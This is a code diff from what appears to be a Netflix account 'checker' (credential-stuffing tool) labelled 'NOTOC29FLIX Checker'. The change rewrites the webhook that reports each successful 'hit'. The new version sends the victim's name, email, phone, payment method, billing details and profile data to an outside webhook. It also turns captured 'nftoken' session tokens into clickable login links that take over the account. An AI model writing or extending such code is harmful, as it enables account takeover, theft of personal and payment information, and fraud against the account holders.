@@ -1027,17 +1027,42 @@ async function startCheck(){
 async function sendWebhookFromFrontend(r, cfg) {
   if (!cfg.notifications?.webhook?.enabled || !cfg.notifications?.webhook?.url) return;
   const url = cfg.notifications.webhook.url;
+  
+  const info = r.info || {};
+  const descLines = [
+    `**👤 NAME:** ${info.name || 'N/A'}`,
+    `**📧 EMAIL:** ${info.email || 'N/A'}`,
+    `**🌍 COUNTRY:** ${info.country || 'N/A'}`,
+    `**📦 PLAN:** ${info.plan || 'N/A'}`,
+    `**📅 MEMBER SINCE:** ${info.member_since || 'N/A'}`,
+    `**🗓️ NEXT BILLING:** ${info.next_billing || 'N/A'}`,
+    `**💳 PAYMENT:** ${info.payment_method || 'N/A'}`,
+    `**📱 PHONE:** ${info.phone || 'N/A'}`,
+    `**🎞️ QUALITY:** ${info.quality || 'N/A'}`,
+    `**📺 STREAMS:** ${info.max_streams || 'N/A'}`,
+    `**💰 PRICE:** ${info.plan_price || 'N/A'}`,
+    `**⏸️ HOLD STATUS:** ${info.hold_status || 'N/A'}`,
+    `**👥 EXTRA MEMBER:** ${info.extra_members || 'N/A'}`,
+    `**✅ EMAIL VERIFIED:** ${info.email_verified || 'N/A'}`,
+    `**🛡️ MEMBERSHIP STATUS:** ${info.membership_status || 'N/A'}`,
+    `**🎭 PROFILES:** ${info.profiles || 'N/A'}`
+  ];
+
+  if (r.nftoken && r.nftoken.token) {
+    const t = r.nftoken.token;
+    const exp = r.nftoken.expires_at_utc || '—';
+    const pcUrl = `https://netflix.com/?nftoken=${encodeURIComponent(t)}`;
+    const mobUrl = `https://netflix.com/unsupported?nftoken=${encodeURIComponent(t)}`;
+    descLines.push('');
+    descLines.push('**🔑 NFTOKEN**');
+    descLines.push(`[🖥️ PC Login](${pcUrl})  |  [📱 Phone Login](${mobUrl})`);
+    descLines.push(`*Valid Till (UTC): ${exp}*`);
+  }
+
   const embed = {
-    title: "🎉 NEW NETFLIX HIT 🎉",
-    color: 0xe50914,
-    fields: [
-      { name: "👤 Email", value: r.info?.email || 'N/A', inline: true },
-      { name: "🏷️ Plan", value: r.info?.plan || 'N/A', inline: true },
-      { name: "🌍 Country", value: r.info?.country || 'N/A', inline: true },
-      { name: "💳 Payment", value: r.info?.payment_method || 'N/A', inline: true },
-      { name: "🎬 Streams", value: String(r.info?.max_streams || 'N/A'), inline: true },
-      { name: "📱 Phone", value: r.info?.phone || 'N/A', inline: true }
-    ],
+    author: { name: `✅ HIT | ${info.plan || 'Premium'} | ${info.country || 'N/A'} · ${info.email || 'N/A'}` },
+    color: 0x46d369, // green hit color
+    description: descLines.join('\n'),
     footer: { text: "NOTOC29FLIX Checker" },
     timestamp: new Date().toISOString()
   };
